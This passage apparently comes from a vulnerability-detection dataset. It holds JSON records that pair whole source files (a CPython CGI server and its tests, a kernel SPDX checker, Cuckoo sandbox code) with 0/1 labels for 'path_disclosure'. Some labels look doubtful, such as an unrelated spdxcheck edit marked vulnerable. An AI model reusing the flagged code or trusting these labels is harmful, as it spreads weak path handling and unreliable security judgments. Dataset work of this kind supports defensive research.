200), \\\n             (res.read(), res.getheader('Content-type'), res.status))\n\n    def test_post(self):\n        params = urllib.urlencode({'spam' : 1, 'eggs' : 'python', 'bacon' : 123456})\n        headers = {'Content-type' : 'application/x-www-form-urlencoded'}\n        res = self.request('/cgi-bin/file2.py', 'POST', params, headers)\n\n        self.assertEquals(res.read(), '1, python, 123456\\n')\n\n    def test_invaliduri(self):\n        res = self.request('/cgi-bin/invalid')\n        res.read()\n        self.assertEquals(res.status, 404)\n\n    def test_authorization(self):\n        headers = {'Authorization' : 'Basic %s' % \\\n                base64.b64encode('username:pass')}\n        res = self.request('/cgi-bin/file1.py', 'GET', headers=headers)\n        self.assertEquals(('Hello World\\n', 'text/html', 200), \\\n             (res.read(), res.getheader('Content-type'), res.status))\n\n    def test_no_leading_slash(self):\n        # http://bugs.python.org/issue2254\n        res = self.request('cgi-bin/file1.py')\n        self.assertEquals(('Hello World\\n', 'text/html', 200),\n             (res.read(), res.getheader('Content-type'), res.status))\n\n\ndef test_main(verbose=None):\n    try:\n        cwd = os.getcwd()\n        test_support.run_unittest(BaseHTTPServerTestCase,\n                                  SimpleHTTPServerTestCase,\n                                  CGIHTTPServerTestCase\n                                  )\n    finally:\n        os.chdir(cwd)\n\nif __name__ == '__main__':\n    test_main()\n/n/n/n", "label": 0, "vtype": "path_disclosure"}, {"id": "923ba361d8f757f0656cfd216525aca4848e02aa", "code": "/Lib/CGIHTTPServer.py/n/n\"\"\"CGI-savvy HTTP Server.\n\nThis module builds on SimpleHTTPServer by implementing GET and POST\nrequests to cgi-bin scripts.\n\nIf the os.fork() function is not present (e.g. on Windows),\nos.popen2() is used as a fallback, with slightly altered semantics; if\nthat function is not present either (e.g. on Macintosh), only Python\nscripts are supported, and they are executed by the current process.\n\nIn all cases, the implementation is intentionally naive -- all\nrequests are executed sychronously.\n\nSECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL\n-- it may execute arbitrary Python code or external programs.\n\nNote that status code 200 is sent prior to execution of a CGI script, so\nscripts cannot send other status codes such as 302 (redirect).\n\"\"\"\n\n\n__version__ = \"0.4\"\n\n__all__ = [\"CGIHTTPRequestHandler\"]\n\nimport os\nimport sys\nimport urllib\nimport BaseHTTPServer\nimport SimpleHTTPServer\nimport select\n\n\nclass CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):\n\n    \"\"\"Complete HTTP server with GET, HEAD and POST commands.\n\n    GET and HEAD also support running CGI scripts.\n\n    The POST command is *only* implemented for CGI scripts.\n\n    \"\"\"\n\n    # Determine platform specifics\n    have_fork = hasattr(os, 'fork')\n    have_popen2 = hasattr(os, 'popen2')\n    have_popen3 = hasattr(os, 'popen3')\n\n    # Make rfile unbuffered -- we need to read one line and then pass\n    # the rest to a subprocess, so we can't use buffered input.\n    rbufsize = 0\n\n    def do_POST(self):\n        \"\"\"Serve a POST request.\n\n        This is only implemented for CGI scripts.\n\n        \"\"\"\n\n        if self.is_cgi():\n            self.run_cgi()\n        else:\n            self.send_error(501, \"Can only POST to CGI scripts\")\n\n    def send_head(self):\n        \"\"\"Version of send_head that support CGI scripts\"\"\"\n        if self.is_cgi():\n            return self.run_cgi()\n        else:\n            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)\n\n    def is_cgi(self):\n        \"\"\"Test whether self.path corresponds to a CGI script,\n        and return a boolean.\n\n        This function sets self.cgi_info to a tuple (dir, rest)\n        when it returns True, where dir is the directory part before\n        the CGI script name.  Note that rest begins with a\n        slash if it is not empty.\n\n        The default implementation tests whether the path\n        begins with one of the strings in the list\n        self.cgi_directories (and the next character is a '/'\n        or the end of the string).\n        \"\"\"\n\n        path = self.path\n\n        for x in self.cgi_directories:\n            i = len(x)\n            if path[:i] == x and (not path[i:] or path[i] == '/'):\n                self.cgi_info = path[:i], path[i+1:]\n                return True\n        return False\n\n    cgi_directories = ['/cgi-bin', '/htbin']\n\n    def is_executable(self, path):\n        \"\"\"Test whether argument path is an executable file.\"\"\"\n        return executable(path)\n\n    def is_python(self, path):\n        \"\"\"Test whether argument path is a Python script.\"\"\"\n        head, tail = os.path.splitext(path)\n        return tail.lower() in (\".py\", \".pyw\")\n\n    def run_cgi(self):\n        \"\"\"Execute a CGI script.\"\"\"\n        path = self.path\n        dir, rest = self.cgi_info\n\n        i = path.find('/', len(dir) + 1)\n        while i >= 0:\n            nextdir = path[:i]\n            nextrest = path[i+1:]\n\n            scriptdir = self.translate_path(nextdir)\n            if os.path.isdir(scriptdir):\n                dir, rest = nextdir, nextrest\n                i = path.find('/', len(dir) + 1)\n            else:\n                break\n\n        # find an explicit query string, if present.\n        i = rest.rfind('?')\n        if i >= 0:\n            rest, query = rest[:i], rest[i+1:]\n        else:\n            query = ''\n\n        # dissect the part after the directory name into a script name &\n        # a possible additional path, to be stored in PATH_INFO.\n        i = rest.find('/')\n        if i >= 0:\n            script, rest = rest[:i], rest[i:]\n        else:\n            script, rest = rest, ''\n\n        scriptname = dir + '/' + script\n        scriptfile = self.translate_path(scriptname)\n        if not os.path.exists(scriptfile):\n            self.send_error(404, \"No such CGI script (%r)\" % scriptname)\n            return\n        if not os.path.isfile(scriptfile):\n            self.send_error(403, \"CGI script is not a plain file (%r)\" %\n                            scriptname)\n            return\n        ispy = self.is_python(scriptname)\n        if not ispy:\n            if not (self.have_fork or self.have_popen2 or self.have_popen3):\n                self.send_error(403, \"CGI script is not a Python script (%r)\" %\n                                scriptname)\n                return\n            if not self.is_executable(scriptfile):\n                self.send_error(403, \"CGI script is not executable (%r)\" %\n                                scriptname)\n                return\n\n        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html\n        # XXX Much of the following could be prepared ahead of time!\n        env = {}\n        env['SERVER_SOFTWARE'] = self.version_string()\n        env['SERVER_NAME'] = self.server.server_name\n        env['GATEWAY_INTERFACE'] = 'CGI/1.1'\n        env['SERVER_PROTOCOL'] = self.protocol_version\n        env['SERVER_PORT'] = str(self.server.server_port)\n        env['REQUEST_METHOD'] = self.command\n        uqrest = urllib.unquote(rest)\n        env['PATH_INFO'] = uqrest\n        env['PATH_TRANSLATED'] = self.translate_path(uqrest)\n        env['SCRIPT_NAME'] = scriptname\n        if query:\n            env['QUERY_STRING'] = query\n        host = self.address_string()\n        if host != self.client_address[0]:\n            env['REMOTE_HOST'] = host\n        env['REMOTE_ADDR'] = self.client_address[0]\n        authorization = self.headers.getheader(\"authorization\")\n        if authorization:\n            authorization = authorization.split()\n            if len(authorization) == 2:\n                import base64, binascii\n                env['AUTH_TYPE'] = authorization[0]\n                if authorization[0].lower() == \"basic\":\n                    try:\n                        authorization = base64.decodestring(authorization[1])\n                    except binascii.Error:\n                        pass\n                    else:\n                        authorization = authorization.split(':')\n                        if len(authorization) == 2:\n                            env['REMOTE_USER'] = authorization[0]\n        # XXX REMOTE_IDENT\n        if self.headers.typeheader is None:\n            env['CONTENT_TYPE'] = self.headers.type\n        else:\n            env['CONTENT_TYPE'] = self.headers.typeheader\n        length = self.headers.getheader('content-length')\n        if length:\n            env['CONTENT_LENGTH'] = length\n        referer = self.headers.getheader('referer')\n        if referer:\n            env['HTTP_REFERER'] = referer\n        accept = []\n        for line in self.headers.getallmatchingheaders('accept'):\n            if line[:1] in \"\\t\\n\\r \":\n                accept.append(line.strip())\n            else:\n                accept = accept + line[7:].split(',')\n        env['HTTP_ACCEPT'] = ','.join(accept)\n        ua = self.headers.getheader('user-agent')\n        if ua:\n            env['HTTP_USER_AGENT'] = ua\n        co = filter(None, self.headers.getheaders('cookie'))\n        if co:\n            env['HTTP_COOKIE'] = ', '.join(co)\n        # XXX Other HTTP_* headers\n        # Since we're setting the env in the parent, provide empty\n        # values to override previously set values\n        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',\n                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):\n            env.setdefault(k, \"\")\n        os.environ.update(env)\n\n        self.send_response(200, \"Script output follows\")\n\n        decoded_query = query.replace('+', ' ')\n\n        if self.have_fork:\n            # Unix -- fork as we should\n            args = [script]\n            if '=' not in decoded_query:\n                args.append(decoded_query)\n            nobody = nobody_uid()\n            self.wfile.flush() # Always flush before forking\n            pid = os.fork()\n            if pid != 0:\n                # Parent\n                pid, sts = os.waitpid(pid, 0)\n                # throw away additional data [see bug #427345]\n                while select.select([self.rfile], [], [], 0)[0]:\n                    if not self.rfile.read(1):\n                        break\n                if sts:\n                    self.log_error(\"CGI script exit status %#x\", sts)\n                return\n            # Child\n            try:\n                try:\n                    os.setuid(nobody)\n                except os.error:\n                    pass\n                os.dup2(self.rfile.fileno(), 0)\n                os.dup2(self.wfile.fileno(), 1)\n                os.execve(scriptfile, args, os.environ)\n            except:\n                self.server.handle_error(self.request, self.client_address)\n                os._exit(127)\n\n        elif self.have_popen2 or self.have_popen3:\n            # Windows -- use popen2 or popen3 to create a subprocess\n            import shutil\n            if self.have_popen3:\n                popenx = os.popen3\n            else:\n                popenx = os.popen2\n            cmdline = scriptfile\n            if self.is_python(scriptfile):\n                interp = sys.executable\n                if interp.lower().endswith(\"w.exe\"):\n                    # On Windows, use python.exe, not pythonw.exe\n                    interp = interp[:-5] + interp[-4:]\n                cmdline = \"%s -u %s\" % (interp, cmdline)\n            if '=' not in query and '\"' not in query:\n                cmdline = '%s \"%s\"' % (cmdline, query)\n            self.log_message(\"command: %s\", cmdline)\n            try:\n                nbytes = int(length)\n            except (TypeError, ValueError):\n                nbytes = 0\n            files = popenx(cmdline, 'b')\n            fi = files[0]\n            fo = files[1]\n            if self.have_popen3:\n                fe = files[2]\n            if self.command.lower() == \"post\" and nbytes > 0:\n                data = self.rfile.read(nbytes)\n                fi.write(data)\n            # throw away additional data [see bug #427345]\n            while select.select([self.rfile._sock], [], [], 0)[0]:\n                if not self.rfile._sock.recv(1):\n                    break\n            fi.close()\n            shutil.copyfileobj(fo, self.wfile)\n            if self.have_popen3:\n                errors = fe.read()\n                fe.close()\n                if errors:\n                    self.log_error('%s', errors)\n            sts = fo.close()\n            if sts:\n                self.log_error(\"CGI script exit status %#x\", sts)\n            else:\n                self.log_message(\"CGI script exited OK\")\n\n        else:\n            # Other O.S. -- execute script in this process\n            save_argv = sys.argv\n            save_stdin = sys.stdin\n            save_stdout = sys.stdout\n            save_stderr = sys.stderr\n            try:\n                save_cwd = os.getcwd()\n                try:\n                    sys.argv = [scriptfile]\n                    if '=' not in decoded_query:\n                        sys.argv.append(decoded_query)\n                    sys.stdout = self.wfile\n                    sys.stdin = self.rfile\n                    execfile(scriptfile, {\"__name__\": \"__main__\"})\n                finally:\n                    sys.argv = save_argv\n                    sys.stdin = save_stdin\n                    sys.stdout = save_stdout\n                    sys.stderr = save_stderr\n                    os.chdir(save_cwd)\n            except SystemExit, sts:\n                self.log_error(\"CGI script exit status %s\", str(sts))\n            else:\n                self.log_message(\"CGI script exited OK\")\n\n\nnobody = None\n\ndef nobody_uid():\n    \"\"\"Internal routine to get nobody's uid\"\"\"\n    global nobody\n    if nobody:\n        return nobody\n    try:\n        import pwd\n    except ImportError:\n        return -1\n    try:\n        nobody = pwd.getpwnam('nobody')[2]\n    except KeyError:\n        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))\n    return nobody\n\n\ndef executable(path):\n    \"\"\"Test for executable file.\"\"\"\n    try:\n        st = os.stat(path)\n    except os.error:\n        return False\n    return st.st_mode & 0111 != 0\n\n\ndef test(HandlerClass = CGIHTTPRequestHandler,\n         ServerClass = BaseHTTPServer.HTTPServer):\n    SimpleHTTPServer.test(HandlerClass, ServerClass)\n\n\nif __name__ == '__main__':\n    test()\n/n/n/n", "label": 1, "vtype": "path_disclosure"}, {"id": "e6d319f68d4dcf355e89a7b21368c47c004a14c2", "code": "scripts/spdxcheck.py/n/n#!/usr/bin/env python\n# SPDX-License-Identifier: GPL-2.0\n# Copyright Thomas Gleixner <tglx@linutronix.de>\n\nfrom argparse import ArgumentParser\nfrom ply import lex, yacc\nimport locale\nimport traceback\nimport sys\nimport git\nimport re\nimport os\n\nclass ParserException(Exception):\n    def __init__(self, tok, txt):\n        self.tok = tok\n        self.txt = txt\n\nclass SPDXException(Exception):\n    def __init__(self, el, txt):\n        self.el = el\n        self.txt = txt\n\nclass SPDXdata(object):\n    def __init__(self):\n        self.license_files = 0\n        self.exception_files = 0\n        self.licenses = [ ]\n        self.exceptions = { }\n\n# Read the spdx data from the LICENSES directory\ndef read_spdxdata(repo):\n\n    # The subdirectories of LICENSES in the kernel source\n    license_dirs = [ \"preferred\", \"deprecated\", \"exceptions\" ]\n    lictree = repo.head.commit.tree['LICENSES']\n\n    spdx = SPDXdata()\n\n    for d in license_dirs:\n        for el in lictree[d].traverse():\n            if not os.path.isfile(el.path):\n                continue\n\n            exception = None\n            for l in open(el.path).readlines():\n                if l.startswith('Valid-License-Identifier:'):\n                    lid = l.split(':')[1].strip().upper()\n                    if lid in spdx.licenses:\n                        raise SPDXException(el, 'Duplicate License Identifier: %s' %lid)\n                    else:\n                        spdx.licenses.append(lid)\n\n                elif l.startswith('SPDX-Exception-Identifier:'):\n                    exception = l.split(':')[1].strip().upper()\n                    spdx.exceptions[exception] = []\n\n                elif l.startswith('SPDX-Licenses:'):\n                    for lic in l.split(':')[1].upper().strip().replace(' ', '').replace('\\t', '').split(','):\n                        if not lic in spdx.licenses:\n                            raise SPDXException(None, 'Exception %s missing license %s' %(ex, lic))\n                        spdx.exceptions[exception].append(lic)\n\n                elif l.startswith(\"License-Text:\"):\n                    if exception:\n                        if not len(spdx.exceptions[exception]):\n                            raise SPDXException(el, 'Exception %s is missing SPDX-Licenses' %excid)\n                        spdx.exception_files += 1\n                    else:\n                        spdx.license_files += 1\n                    break\n    return spdx\n\nclass id_parser(object):\n\n    reserved = [ 'AND', 'OR', 'WITH' ]\n    tokens = [ 'LPAR', 'RPAR', 'ID', 'EXC' ] + reserved\n\n    precedence = ( ('nonassoc', 'AND', 'OR'), )\n\n    t_ignore = ' \\t'\n\n    def __init__(self, spdx):\n        self.spdx = spdx\n        self.lasttok = None\n        self.lastid = None\n        self.lexer = lex.lex(module = self, reflags = re.UNICODE)\n        # Initialize the parser. No debug file and no parser rules stored on disk\n        # The rules are small enough to be generated on the fly\n        self.parser = yacc.yacc(module = self, write_tables = False, debug = False)\n        self.lines_checked = 0\n        self.checked = 0\n        self.spdx_valid = 0\n        self.spdx_errors = 0\n        self.curline = 0\n        self.deepest = 0\n\n    # Validate License and Exception IDs\n    def validate(self, tok):\n        id = tok.value.upper()\n        if tok.type == 'ID':\n            if not id in self.spdx.licenses:\n                raise ParserException(tok, 'Invalid License ID')\n            self.lastid = id\n        elif tok.type == 'EXC':\n            if id not in self.spdx.exceptions:\n                raise ParserException(tok, 'Invalid Exception ID')\n            if self.lastid not in self.spdx.exceptions[id]:\n                raise ParserException(tok, 'Exception not valid for license %s' %self.lastid)\n            self.lastid = None\n        elif tok.type != 'WITH':\n            self.lastid = None\n\n    # Lexer functions\n    def t_RPAR(self, tok):\n        r'\\)'\n        self.lasttok = tok.type\n        return tok\n\n    def t_LPAR(self, tok):\n        r'\\('\n        self.lasttok = tok.type\n        return tok\n\n    def t_ID(self, tok):\n        r'[A-Za-z.0-9\\-+]+'\n\n        if self.lasttok == 'EXC':\n            print(tok)\n            raise ParserException(tok, 'Missing parentheses')\n\n        tok.value = tok.value.strip()\n        val = tok.value.upper()\n\n        if val in self.reserved:\n            tok.type = val\n        elif self.lasttok == 'WITH':\n            tok.type = 'EXC'\n\n        self.lasttok = tok.type\n        self.validate(tok)\n        return tok\n\n    def t_error(self, tok):\n        raise ParserException(tok, 'Invalid token')\n\n    def p_expr(self, p):\n        '''expr : ID\n                | ID WITH EXC\n                | expr AND expr\n                | expr OR expr\n                | LPAR expr RPAR'''\n        pass\n\n    def p_error(self, p):\n        if not p:\n            raise ParserException(None, 'Unfinished license expression')\n        else:\n            raise ParserException(p, 'Syntax error')\n\n    def parse(self, expr):\n        self.lasttok = None\n        self.lastid = None\n        self.parser.parse(expr, lexer = self.lexer)\n\n    def parse_lines(self, fd, maxlines, fname):\n        self.checked += 1\n        self.curline = 0\n        try:\n            for line in fd:\n                line = line.decode(locale.getpreferredencoding(False), errors='ignore')\n                self.curline += 1\n                if self.curline > maxlines:\n                    break\n                self.lines_checked += 1\n                if line.find(\"SPDX-License-Identifier:\") < 0:\n                    continue\n                expr = line.split(':')[1].strip()\n                # Remove trailing comment closure\n                if line.strip().endswith('*/'):\n                    expr = expr.rstrip('*/').strip()\n                # Special case for SH magic boot code files\n                if line.startswith('LIST \\\"'):\n                    expr = expr.rstrip('\\\"').strip()\n                self.parse(expr)\n                self.spdx_valid += 1\n                #\n                # Should we check for more SPDX ids in the same file and\n                # complain if there are any?\n                #\n                break\n\n        except ParserException as pe:\n            if pe.tok:\n                col = line.find(expr) + pe.tok.lexpos\n                tok = pe.tok.value\n                sys.stdout.write('%s: %d:%d %s: %s\\n' %(fname, self.curline, col, pe.txt, tok))\n            else:\n                sys.stdout.write('%s: %d:0 %s\\n' %(fname, self.curline, col, pe.txt))\n            self.spdx_errors += 1\n\ndef scan_git_tree(tree):\n    for el in tree.traverse():\n        # Exclude stuff which would make pointless noise\n        # FIXME: Put this somewhere more sensible\n        if el.path.startswith(\"LICENSES\"):\n            continue\n        if el.path.find(\"license-rules.rst\") >= 0:\n            continue\n        if not os.path.isfile(el.path):\n            continue\n        with open(el.path, 'rb') as fd:\n            parser.parse_lines(fd, args.maxlines, el.path)\n\ndef scan_git_subtree(tree, path):\n    for p in path.strip('/').split('/'):\n        tree = tree[p]\n    scan_git_tree(tree)\n\nif __name__ == '__main__':\n\n    ap = ArgumentParser(description='SPDX expression checker')\n    ap.add_argument('path', nargs='*', help='Check path or file. If not given full git tree scan. For stdin use \"-\"')\n    ap.add_argument('-m', '--maxlines', type=int, default=15,\n                    help='Maximum number of lines to scan in a file. Default 15')\n    ap.add_argument('-v', '--verbose', action='store_true', help='Verbose statistics output')\n    args = ap.parse_args()\n\n    # Sanity check path arguments\n    if '-' in args.path and len(args.path) > 1:\n        sys.stderr.write('stdin input \"-\" must be the only path argument\\n')\n        sys.exit(1)\n\n    try:\n        # Use git to get the valid license expressions\n        repo = git.Repo(os.getcwd())\n        assert not repo.bare\n\n        # Initialize SPDX data\n        spdx = read_spdxdata(repo)\n\n        # Initilize the parser\n        parser = id_parser(spdx)\n\n    except SPDXException as se:\n        if se.el:\n            sys.stderr.write('%s: %s\\n' %(se.el.path, se.txt))\n        else:\n            sys.stderr.write('%s\\n' %se.txt)\n        sys.exit(1)\n\n    except Exception as ex:\n        sys.stderr.write('FAIL: %s\\n' %ex)\n        sys.stderr.write('%s\\n' %traceback.format_exc())\n        sys.exit(1)\n\n    try:\n        if len(args.path) and args.path[0] == '-':\n            stdin = os.fdopen(sys.stdin.fileno(), 'rb')\n            parser.parse_lines(stdin, args.maxlines, '-')\n        else:\n            if args.path:\n                for p in args.path:\n                    if os.path.isfile(p):\n                        parser.parse_lines(open(p, 'rb'), args.maxlines, p)\n                    elif os.path.isdir(p):\n                        scan_git_subtree(repo.head.reference.commit.tree, p)\n                    else:\n                        sys.stderr.write('path %s does not exist\\n' %p)\n                        sys.exit(1)\n            else:\n                # Full git tree scan\n                scan_git_tree(repo.head.commit.tree)\n\n            if args.verbose:\n                sys.stderr.write('\\n')\n                sys.stderr.write('License files:     %12d\\n' %spdx.license_files)\n                sys.stderr.write('Exception files:   %12d\\n' %spdx.exception_files)\n                sys.stderr.write('License IDs        %12d\\n' %len(spdx.licenses))\n                sys.stderr.write('Exception IDs      %12d\\n' %len(spdx.exceptions))\n                sys.stderr.write('\\n')\n                sys.stderr.write('Files checked:     %12d\\n' %parser.checked)\n                sys.stderr.write('Lines checked:     %12d\\n' %parser.lines_checked)\n                sys.stderr.write('Files with SPDX:   %12d\\n' %parser.spdx_valid)\n                sys.stderr.write('Files with errors: %12d\\n' %parser.spdx_errors)\n\n            sys.exit(0)\n\n    except Exception as ex:\n        sys.stderr.write('FAIL: %s\\n' %ex)\n        sys.stderr.write('%s\\n' %traceback.format_exc())\n        sys.exit(1)\n/n/n/n", "label": 0, "vtype": "path_disclosure"}, {"id": "e6d319f68d4dcf355e89a7b21368c47c004a14c2", "code": "/scripts/spdxcheck.py/n/n#!/usr/bin/env python\n# SPDX-License-Identifier: GPL-2.0\n# Copyright Thomas Gleixner <tglx@linutronix.de>\n\nfrom argparse import ArgumentParser\nfrom ply import lex, yacc\nimport locale\nimport traceback\nimport sys\nimport git\nimport re\nimport os\n\nclass ParserException(Exception):\n    def __init__(self, tok, txt):\n        self.tok = tok\n        self.txt = txt\n\nclass SPDXException(Exception):\n    def __init__(self, el, txt):\n        self.el = el\n        self.txt = txt\n\nclass SPDXdata(object):\n    def __init__(self):\n        self.license_files = 0\n        self.exception_files = 0\n        self.licenses = [ ]\n        self.exceptions = { }\n\n# Read the spdx data from the LICENSES directory\ndef read_spdxdata(repo):\n\n    # The subdirectories of LICENSES in the kernel source\n    license_dirs = [ \"preferred\", \"other\", \"exceptions\" ]\n    lictree = repo.head.commit.tree['LICENSES']\n\n    spdx = SPDXdata()\n\n    for d in license_dirs:\n        for el in lictree[d].traverse():\n            if not os.path.isfile(el.path):\n                continue\n\n            exception = None\n            for l in open(el.path).readlines():\n                if l.startswith('Valid-License-Identifier:'):\n                    lid = l.split(':')[1].strip().upper()\n                    if lid in spdx.licenses:\n                        raise SPDXException(el, 'Duplicate License Identifier: %s' %lid)\n                    else:\n                        spdx.licenses.append(lid)\n\n                elif l.startswith('SPDX-Exception-Identifier:'):\n                    exception = l.split(':')[1].strip().upper()\n                    spdx.exceptions[exception] = []\n\n                elif l.startswith('SPDX-Licenses:'):\n                    for lic in l.split(':')[1].upper().strip().replace(' ', '').replace('\\t', '').split(','):\n                        if not lic in spdx.licenses:\n                            raise SPDXException(None, 'Exception %s missing license %s' %(ex, lic))\n                        spdx.exceptions[exception].append(lic)\n\n                elif l.startswith(\"License-Text:\"):\n                    if exception:\n                        if not len(spdx.exceptions[exception]):\n                            raise SPDXException(el, 'Exception %s is missing SPDX-Licenses' %excid)\n                        spdx.exception_files += 1\n                    else:\n                        spdx.license_files += 1\n                    break\n    return spdx\n\nclass id_parser(object):\n\n    reserved = [ 'AND', 'OR', 'WITH' ]\n    tokens = [ 'LPAR', 'RPAR', 'ID', 'EXC' ] + reserved\n\n    precedence = ( ('nonassoc', 'AND', 'OR'), )\n\n    t_ignore = ' \\t'\n\n    def __init__(self, spdx):\n        self.spdx = spdx\n        self.lasttok = None\n        self.lastid = None\n        self.lexer = lex.lex(module = self, reflags = re.UNICODE)\n        # Initialize the parser. No debug file and no parser rules stored on disk\n        # The rules are small enough to be generated on the fly\n        self.parser = yacc.yacc(module = self, write_tables = False, debug = False)\n        self.lines_checked = 0\n        self.checked = 0\n        self.spdx_valid = 0\n        self.spdx_errors = 0\n        self.curline = 0\n        self.deepest = 0\n\n    # Validate License and Exception IDs\n    def validate(self, tok):\n        id = tok.value.upper()\n        if tok.type == 'ID':\n            if not id in self.spdx.licenses:\n                raise ParserException(tok, 'Invalid License ID')\n            self.lastid = id\n        elif tok.type == 'EXC':\n            if id not in self.spdx.exceptions:\n                raise ParserException(tok, 'Invalid Exception ID')\n            if self.lastid not in self.spdx.exceptions[id]:\n                raise ParserException(tok, 'Exception not valid for license %s' %self.lastid)\n            self.lastid = None\n        elif tok.type != 'WITH':\n            self.lastid = None\n\n    # Lexer functions\n    def t_RPAR(self, tok):\n        r'\\)'\n        self.lasttok = tok.type\n        return tok\n\n    def t_LPAR(self, tok):\n        r'\\('\n        self.lasttok = tok.type\n        return tok\n\n    def t_ID(self, tok):\n        r'[A-Za-z.0-9\\-+]+'\n\n        if self.lasttok == 'EXC':\n            print(tok)\n            raise ParserException(tok, 'Missing parentheses')\n\n        tok.value = tok.value.strip()\n        val = tok.value.upper()\n\n        if val in self.reserved:\n            tok.type = val\n        elif self.lasttok == 'WITH':\n            tok.type = 'EXC'\n\n        self.lasttok = tok.type\n        self.validate(tok)\n        return tok\n\n    def t_error(self, tok):\n        raise ParserException(tok, 'Invalid token')\n\n    def p_expr(self, p):\n        '''expr : ID\n                | ID WITH EXC\n                | expr AND expr\n                | expr OR expr\n                | LPAR expr RPAR'''\n        pass\n\n    def p_error(self, p):\n        if not p:\n            raise ParserException(None, 'Unfinished license expression')\n        else:\n            raise ParserException(p, 'Syntax error')\n\n    def parse(self, expr):\n        self.lasttok = None\n        self.lastid = None\n        self.parser.parse(expr, lexer = self.lexer)\n\n    def parse_lines(self, fd, maxlines, fname):\n        self.checked += 1\n        self.curline = 0\n        try:\n            for line in fd:\n                line = line.decode(locale.getpreferredencoding(False), errors='ignore')\n                self.curline += 1\n                if self.curline > maxlines:\n                    break\n                self.lines_checked += 1\n                if line.find(\"SPDX-License-Identifier:\") < 0:\n                    continue\n                expr = line.split(':')[1].strip()\n                # Remove trailing comment closure\n                if line.strip().endswith('*/'):\n                    expr = expr.rstrip('*/').strip()\n                # Special case for SH magic boot code files\n                if line.startswith('LIST \\\"'):\n                    expr = expr.rstrip('\\\"').strip()\n                self.parse(expr)\n                self.spdx_valid += 1\n                #\n                # Should we check for more SPDX ids in the same file and\n                # complain if there are any?\n                #\n                break\n\n        except ParserException as pe:\n            if pe.tok:\n                col = line.find(expr) + pe.tok.lexpos\n                tok = pe.tok.value\n                sys.stdout.write('%s: %d:%d %s: %s\\n' %(fname, self.curline, col, pe.txt, tok))\n            else:\n                sys.stdout.write('%s: %d:0 %s\\n' %(fname, self.curline, col, pe.txt))\n            self.spdx_errors += 1\n\ndef scan_git_tree(tree):\n    for el in tree.traverse():\n        # Exclude stuff which would make pointless noise\n        # FIXME: Put this somewhere more sensible\n        if el.path.startswith(\"LICENSES\"):\n            continue\n        if el.path.find(\"license-rules.rst\") >= 0:\n            continue\n        if not os.path.isfile(el.path):\n            continue\n        with open(el.path, 'rb') as fd:\n            parser.parse_lines(fd, args.maxlines, el.path)\n\ndef scan_git_subtree(tree, path):\n    for p in path.strip('/').split('/'):\n        tree = tree[p]\n    scan_git_tree(tree)\n\nif __name__ == '__main__':\n\n    ap = ArgumentParser(description='SPDX expression checker')\n    ap.add_argument('path', nargs='*', help='Check path or file. If not given full git tree scan. For stdin use \"-\"')\n    ap.add_argument('-m', '--maxlines', type=int, default=15,\n                    help='Maximum number of lines to scan in a file. Default 15')\n    ap.add_argument('-v', '--verbose', action='store_true', help='Verbose statistics output')\n    args = ap.parse_args()\n\n    # Sanity check path arguments\n    if '-' in args.path and len(args.path) > 1:\n        sys.stderr.write('stdin input \"-\" must be the only path argument\\n')\n        sys.exit(1)\n\n    try:\n        # Use git to get the valid license expressions\n        repo = git.Repo(os.getcwd())\n        assert not repo.bare\n\n        # Initialize SPDX data\n        spdx = read_spdxdata(repo)\n\n        # Initilize the parser\n        parser = id_parser(spdx)\n\n    except SPDXException as se:\n        if se.el:\n            sys.stderr.write('%s: %s\\n' %(se.el.path, se.txt))\n        else:\n            sys.stderr.write('%s\\n' %se.txt)\n        sys.exit(1)\n\n    except Exception as ex:\n        sys.stderr.write('FAIL: %s\\n' %ex)\n        sys.stderr.write('%s\\n' %traceback.format_exc())\n        sys.exit(1)\n\n    try:\n        if len(args.path) and args.path[0] == '-':\n            stdin = os.fdopen(sys.stdin.fileno(), 'rb')\n            parser.parse_lines(stdin, args.maxlines, '-')\n        else:\n            if args.path:\n                for p in args.path:\n                    if os.path.isfile(p):\n                        parser.parse_lines(open(p, 'rb'), args.maxlines, p)\n                    elif os.path.isdir(p):\n                        scan_git_subtree(repo.head.reference.commit.tree, p)\n                    else:\n                        sys.stderr.write('path %s does not exist\\n' %p)\n                        sys.exit(1)\n            else:\n                # Full git tree scan\n                scan_git_tree(repo.head.commit.tree)\n\n            if args.verbose:\n                sys.stderr.write('\\n')\n                sys.stderr.write('License files:     %12d\\n' %spdx.license_files)\n                sys.stderr.write('Exception files:   %12d\\n' %spdx.exception_files)\n                sys.stderr.write('License IDs        %12d\\n' %len(spdx.licenses))\n                sys.stderr.write('Exception IDs      %12d\\n' %len(spdx.exceptions))\n                sys.stderr.write('\\n')\n                sys.stderr.write('Files checked:     %12d\\n' %parser.checked)\n                sys.stderr.write('Lines checked:     %12d\\n' %parser.lines_checked)\n                sys.stderr.write('Files with SPDX:   %12d\\n' %parser.spdx_valid)\n                sys.stderr.write('Files with errors: %12d\\n' %parser.spdx_errors)\n\n            sys.exit(0)\n\n    except Exception as ex:\n        sys.stderr.write('FAIL: %s\\n' %ex)\n        sys.stderr.write('%s\\n' %traceback.format_exc())\n        sys.exit(1)\n/n/n/n", "label": 1, "vtype": "path_disclosure"}, {"id": "168cabf86730d56b7fa319278bf0f0034052666a", "code": "cuckoo/core/submit.py/n/n# Copyright (C) 2016-2017 Cuckoo Foundation.\n# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org\n# See the file 'docs/LICENSE' for copying permission.\n\nimport copy\nimport logging\nimport os\nimport sflock\n\nfrom cuckoo.common.config import emit_options\nfrom cuckoo.common.exceptions import CuckooOperationalError\nfrom cuckoo.common.files import Folders, Files, Storage\nfrom cuckoo.common.utils import validate_url, validate_hash\nfrom cuckoo.common.virustotal import VirusTotalAPI\nfrom cuckoo.core.database import Database\n\nlog = logging.getLogger(__name__)\n\ndb = Database()\n\nclass SubmitManager(object):\n    def _handle_string(self, submit, tmppath, line):\n        if not line:\n            return\n\n        if validate_hash(line):\n            try:\n                filedata = VirusTotalAPI().hash_fetch(line)\n            except CuckooOperationalError as e:\n                submit[\"errors\"].append(\n                    \"Error retrieving file hash: %s\" % e\n                )\n                return\n\n            filepath = Files.create(tmppath, line, 